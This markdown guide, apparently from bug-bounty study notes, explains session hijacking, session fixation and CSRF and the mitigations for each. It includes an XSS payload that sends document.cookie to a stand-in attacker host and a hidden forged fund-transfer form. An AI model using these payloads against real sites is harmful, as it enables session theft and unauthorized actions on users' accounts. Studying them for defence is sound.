# Session Security

[Relative Cheat Sheet](./session-security-cheat.md)

## Overview
Session security vulnerabilities occur when the mechanisms used to manage user sessions—typically through cookies or tokens—are poorly implemented. These vulnerabilities allow attackers to hijack active sessions, fix session identifiers to gain unauthorized access, or forge requests to perform actions on behalf of users. Common issues include weak session ID generation, improper session timeouts, and insufficient protection against Cross-Site Request Forgery (CSRF). Understanding these risks is crucial for securing web applications and identifying exploitable weaknesses in bug bounty programs.

## Session Hijacking
- **Description**: Session hijacking involves an attacker stealing a valid session token, often through techniques like Cross-Site Scripting (XSS) or network sniffing. Once obtained, the attacker can impersonate the victim, accessing their account without credentials.
- **Examples**: An XSS payload like `<script>new Image().src='http://attacker.com/?c='+document.cookie;</script>` sends the session cookie to the attacker's server. Weak transport (HTTP instead of HTTPS) allows sniffing via tools like Wireshark.
- **Mitigation**: Set the `HttpOnly` flag to prevent JavaScript access to cookies, use the `Secure` flag to enforce HTTPS, and employ encryption (TLS) to protect transmission.

## Session Fixation
- **Description**: In session fixation, an attacker provides a victim with a known session ID before authentication. If the application accepts this ID post-login without regeneration, the attacker can use it to hijack the session.
- **Examples**: An attacker sends a link with `?sessionid=abc123` to the victim. After login, the same ID remains active, allowing the attacker to reuse it.
- **Mitigation**: Generate a new session ID upon successful authentication and invalidate the old one. Implement session ID rotation to prevent reuse of pre-set values.

## CSRF (Cross-Site Request Forgery)
- **Description**: CSRF tricks a user into performing actions on a site where they are authenticated, typically via a forged HTTP request (GET or POST) from another domain. This exploits the trust a site has in the user’s browser session.
- **Examples**: A malicious site hosts a hidden form `<form action="https://bank.com/transfer" method="POST"><input type="hidden" name="amount" value="1000">` that submits when loaded, transferring funds if the user is logged into `bank.com`.
- **Mitigation**: Use unique, per-request CSRF tokens validated server-side, apply the `SameSite` cookie attribute (e.g., `SameSite=Strict`), and restrict sensitive actions to POST with token checks.

## Additional Considerations
- **Session Timeout**: Sessions should expire after a reasonable period (e.g., 15-30 minutes of inactivity for sensitive apps) to limit exposure if a token is compromised. Implement absolute timeouts (e.g., 24 hours) for added security.
- **Entropy and Randomness**: Session IDs must be cryptographically random (e.g., 128-bit or more) to resist brute-force attacks. Weak IDs (e.g., sequential numbers) are easily guessed.
- **Logout Functionality**: Ensure logout invalidates the session ID server-side, not just client-side, to prevent reuse.

## Prevention Strategies
- Enforce strong, random session IDs with sufficient entropy (e.g., UUID v4 or secure random generators).
- Set appropriate session timeouts based on application sensitivity, balancing security and user experience.
- Use the `SameSite` attribute to mitigate CSRF, combined with secure cookie flags and token validation.
- Regularly audit session management code for weaknesses, using tools like OWASP ZAP to simulate attacks.

This guide provides a detailed foundation for understanding session security, drawing from web security best practices and the provided cheat sheet. Explore further with resources like [OWASP Session Management](https://owasp.org/www-community/attacks/Session_fixation).